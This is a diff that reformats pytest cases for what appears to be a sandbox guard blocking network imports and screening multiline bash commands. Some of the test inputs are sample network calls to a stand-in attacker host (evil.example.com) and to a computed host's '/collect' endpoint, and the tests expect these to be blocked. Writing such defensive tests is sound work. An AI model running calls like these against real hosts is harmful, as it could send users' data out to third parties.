@@ -177,7 +177,7 @@ class TestNetworkImportAliases:
                 id = "from_import_create_connection_blocked",
             ),
             pytest.param(
-                'import urllib.request\n'
+                "import urllib.request\n"
                 'urllib.request.urlopen(urllib.request.Request("http://evil.example.com/x"))',
                 id = "request_object_blocked",
             ),
@@ -219,7 +219,7 @@ class TestUnreadableNetworkHost:
                 id = "concatenated_host_blocked",
             ),
             pytest.param(
-                "import requests\nrequests.get(f\"http://{host}/collect\")",
+                'import requests\nrequests.get(f"http://{host}/collect")',
                 id = "f_string_host_blocked",
             ),
             pytest.param(
@@ -2107,9 +2107,7 @@ class TestBashBlocklistNewlineCommandPosition:
             pytest.param("echo hi\nmake test\necho done", id = "three_benign_lines_allowed"),
             # A newline inside quotes is data the command receives, not a separator.
             pytest.param("echo 'first\nsecond'", id = "quoted_newline_stays_an_argument"),
-            pytest.param(
-                "python -c 'import os\nprint(os.getcwd())'", id = "python_c_script_allowed"
-            ),
+            pytest.param("python -c 'import os\nprint(os.getcwd())'", id = "python_c_script_allowed"),
         ],
     )
     def test_benign_multiline_allowed(self, command):
